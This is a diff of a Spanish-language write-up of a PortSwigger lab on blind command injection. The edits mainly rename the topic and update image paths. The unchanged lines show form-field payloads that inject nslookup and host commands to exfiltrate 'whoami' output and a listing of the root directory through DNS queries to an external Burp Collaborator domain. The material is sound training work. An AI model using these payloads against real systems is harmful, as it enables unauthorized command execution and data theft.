@@ -1,16 +1,16 @@
 ---
-title: "Blind OS command injection with out-of-band data exfiltration"
-description: "Laboratorio de Portswigger sobre OS Command Injection"
+title: "Blind command injection with out-of-band data exfiltration"
+description: "Laboratorio de Portswigger sobre Command Injection"
 date: 2024-12-01 12:26:00 +0800
 lang: es-ES
 author: Justice-Reaper
 categories:
   - Portswigger Labs
-  - OS Command Injection
+  - Command Injection
 tags:
   - Portswigger Labs
-  - OS Command Injection
-  - Blind OS command injection with out-of-band data exfiltration
+  - Command Injection
+  - Blind command injection with out-of-band data exfiltration
 image:
   path: /assets/img/Portswigger/Portswigger.png
 ---
@@ -24,27 +24,31 @@ image:
   
 ## Descripción
 
-Este `laboratorio` contiene una `Blind OS Command Injection` en la `función` de `comentarios`. La aplicación `ejecuta` un `comando` en la `terminal` que incluye `datos` proporcionados por el `usuario`. El `comando` se ejecuta de forma `asíncrona` y no tiene efecto en la `respuesta` de la aplicación. No es posible `redireccionar` la `salida` a una `ubicación` accesible. Sin embargo, es posible desencadenar `out-of-band interactions` con un `dominio externo`. Para resolver el `laboratorio`, debemos ejecutar el `comando` `whoami` y exfiltra su `salida` mediante una `consulta DNS` a `Burp Collaborator`. Necesitaremos introducir el `nombre` del `usuario` actual para completar el `laboratorio`
+Este `laboratorio` contiene una `Blind Command Injection` en la `función` de `comentarios`. La aplicación `ejecuta` un `comando` en la `terminal` que incluye `datos` proporcionados por el `usuario`. El `comando` se ejecuta de forma `asíncrona` y no tiene efecto en la `respuesta` de la aplicación. No es posible `redireccionar` la `salida` a una `ubicación` accesible. Sin embargo, es posible desencadenar `out-of-band interactions` con un `dominio externo`. Para resolver el `laboratorio`, debemos ejecutar el `comando` `whoami` y exfiltra su `salida` mediante una `consulta DNS` a `Burp Collaborator`. Necesitaremos introducir el `nombre` del `usuario` actual para completar el `laboratorio`
 
 ---
+
+## Guía de command injection
+
+`Antes` de `completar` este `laboratorio` es recomendable `leerse` esta `guía de command injection` [https://justice-reaper.github.io/posts/Command-Injection-Guide/](https://justice-reaper.github.io/posts/Command-Injection-Guide/)
 
 ## Resolución
 
 Al `acceder` a la `web` nos sale esto
 
-![](/assets/img/OS-Command-Injection-Lab-5/image_1.png)
+![](/assets/img/Command-Injection-Lab-5/image_1.png)
 
 Pulsamos en `Submit feedback` y vemos un `formulario`
 
-![](/assets/img/OS-Command-Injection-Lab-5/image_2.png)
+![](/assets/img/Command-Injection-Lab-5/image_2.png)
 
 Hacemos `click` sobre `Submit feedback` y `capturamos` la `petición` con `Burpsuite`
 
-![](/assets/img/OS-Command-Injection-Lab-5/image_3.png)
+![](/assets/img/Command-Injection-Lab-5/image_3.png)
 
 La `respuesta` obtenida son unas `llaves vacías {}`
 
-![](/assets/img/OS-Command-Injection-Lab-5/image_4.png)
+![](/assets/img/Command-Injection-Lab-5/image_4.png)
 
 Nos dirigimos a `Burpsuite Collaborator` hacemos `click` en `Copy to clipboard`, debido a que no recibimos `ninguna respuesta` que indique que estamos `inyectando comandos`, esta es la única forma que podemos utilizar para ello, debemos usar este `payload` en los diferentes `campos` para ver si son `inyectables`
 
@@ -54,7 +58,7 @@ csrf=h2bWPuUAS3XRnSo6w2sMMhhnp9pXPlbe&name=test&email=||nslookup+`whoami`.s6z1cm
 
 Si nos vamos a `Burpsuite Collaborator` nuevamente veremos que hemos obtenido `dos peticiones DNS` con el `output` del comando `whoami`
 
-![](/assets/img/OS-Command-Injection-Lab-5/image_5.png)
+![](/assets/img/Command-Injection-Lab-5/image_5.png)
 
 Si necesitamos obtener más de una línea podemos usar este otro `payload` de `Hacktricks` [https://book.hacktricks.xyz/pentesting-web/command-injection#dns-based-data-exfiltration](https://book.hacktricks.xyz/pentesting-web/command-injection#dns-based-data-exfiltration)
 
@@ -64,4 +68,4 @@ csrf=h2bWPuUAS3XRnSo6w2sMMhhnp9pXPlbe&name=test&email=||for+i+in+$(ls+/);+do+hos
 
 Pulsamos en `Submit solution` e `introducimos` el nombre de usuario `peter-qflr5j`
 
-![](/assets/img/OS-Command-Injection-Lab-5/image_6.png)
+![](/assets/img/Command-Injection-Lab-5/image_6.png)
